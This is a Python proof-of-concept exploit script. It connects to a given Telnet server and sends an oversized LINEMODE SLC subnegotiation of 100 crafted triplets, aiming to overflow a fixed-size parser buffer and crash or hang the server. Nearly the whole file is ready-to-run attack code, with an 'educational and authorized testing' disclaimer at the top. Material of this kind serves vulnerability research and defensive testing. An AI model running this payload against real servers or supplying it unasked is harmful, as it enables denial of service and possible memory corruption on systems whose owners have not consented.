#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Proof-of-Concept: SLC Subnegotiation Buffer Overflow via Excessive Triplets

This script demonstrates a vulnerability in Telnet LINEMODE implementations
where the SLC (Special Character) subnegotiation parser may not validate
the number of octet triplets sent. By sending hundreds of triplets,
a fixed-size buffer allocation could be overflowed.

RFC 1184 Section 2.4 states:
  "The SLC suboption uses a list of octet triplets. The first octet specifies
   the function, the second octet specifies modifiers to the function, and
   the third octet specifies the ASCII character for the function."

It does not explicitly limit the number of triplets, but implementations
often expect only the defined SLC functions (e.g., SLC_BRK, SLC_EOF, etc.).

Usage:
    python3 poc_slc_subnegotiation_buffer_overflow.py <target_ip> <target_port>

Disclaimer:
    This script is for educational and authorized testing purposes only.
    Do not use against systems you do not own or have explicit permission to test.
"""

import socket
import sys
import struct

# Telnet Command Constants
IAC = 0xFF
SB = 0xFA
SE = 0xF0
LINEMODE = 32
SLC = 1

# SLC Function Codes (from RFC 1184)
SLC_BRK = 0
SLC_EOF = 1
SLC_EOT = 2
SLC_IP = 3
SLC_SUSP = 4
SLC_AINT = 5
SLC_AORU = 6
SLC_AOL = 7
SLC_SLCT = 8
SLC_XONXOFF = 9
SLC_EC = 10
SLC_EW = 11
SLC_ER = 12
SLC_EL = 13
SLC_KILL = 14
SLC_REPRINT = 15
SLC_ABORT = 16

# Modifier Flags
SLC_NOSUPPORT = 0
SLC_CANCHANGE = 1
SLC_SHOULDCHANGE = 2
SLC_DONTCHANGE = 3

def craft_slc_payload(num_triplets):
    """
    Craft the SLC subnegotiation payload with a specified number of triplets.
    
    Each triplet consists of:
      - Octet 1: SLC Function Code
      - Octet 2: Modifier
      - Octet 3: ASCII Character
    """
    triplets = b''
    for i in range(num_triplets):
        # Cycle through defined function codes for realism
        func_code = i % 17  # 0 to 16
        modifier = SLC_CANCHANGE
        char_code = 0x0A    # Example: Line Feed
        triplets += struct.pack('BBB', func_code, modifier, char_code)
    return triplets

def send_telnet_command(sock, command):
    """
    Send a Telnet command sequence: IAC SB LINEMODE SLC [triplets] IAC SE
    """
    # IAC SB LINEMODE SLC
    header = struct.pack('BBBB', IAC, SB, LINEMODE, SLC)
    # IAC SE
    footer = struct.pack('BB', IAC, SE)
    
    full_command = header + command + footer
    sock.sendall(full_command)
    print(f"[*] Sent SLC subnegotiation with {len(command)//3} triplets ({len(full_command)} bytes total)")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    # Number of triplets to send. 
    # A typical implementation might expect ~17 triplets (one per function).
    # Sending significantly more (e.g., 100+) may trigger a buffer overflow.
    num_triplets = 100
    
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Crafting SLC payload with {num_triplets} triplets...")
    
    try:
        # Create a raw TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set timeout to avoid hanging
        
        # Connect to the target
        print(f"[*] Connecting to {target_ip}:{target_port}...")
        sock.connect((target_ip, target_port))
        print("[+] Connected successfully.")
        
        # Craft and send the malicious SLC subnegotiation
        payload = craft_slc_payload(num_triplets)
        send_telnet_command(sock, payload)
        
        # Wait for response or connection closure
        try:
            response = sock.recv(1024)
            if response:
                print(f"[+] Received response ({len(response)} bytes): {response.hex()}")
            else:
                print("[+] Connection closed by server (possible crash or rejection).")
        except socket.timeout:
            print("[+] No response received (timeout). Server may be hung or crashed.")
        except ConnectionResetError:
            print("[+] Connection reset by peer. Server may have crashed.")
        
    except socket.error as e:
        print(f"[!] Socket error: {e}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    finally:
        sock.close()
        print("[*] Connection closed.")

if __name__ == "__main__":
    main()
